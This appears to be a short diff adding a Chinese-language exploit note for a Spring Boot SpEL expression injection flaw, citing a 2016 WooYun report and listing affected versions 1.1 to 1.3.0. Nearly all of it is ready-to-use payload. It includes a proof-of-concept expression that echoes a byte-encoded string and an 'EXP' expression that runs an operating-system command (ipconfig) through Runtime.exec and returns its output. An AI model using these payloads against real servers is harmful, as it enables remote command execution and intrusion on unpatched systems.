@@ -1,0 +1,19 @@
+漏洞：http://www.wooyun.org/bugs/wooyun-2016-0226888
+影响版本：Spring Boot 1.1 1.2 1.3.0 
+
+用法：
+   替换参数为：
+
+Spring SPEL表达式POC
+
+${new%20java.lang.String(new%20byte[]{70, 66, 66, 50, 48, 52, 65, 52, 48, 54, 49, 70, 70, 66, 68, 52, 49, 50, 56, 52, 65, 56, 52, 67, 50, 53, 56, 67, 49, 66, 70, 66})}
+结果：
+FBB204A4061FFBD41284A84C258C1BFB
+
+返回结果是md5(wooyun)
+
+Spring SPEL表达式EXP
+
+${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ipconfig').getInputStream())}
+
+直接执行命令，返回结果！！
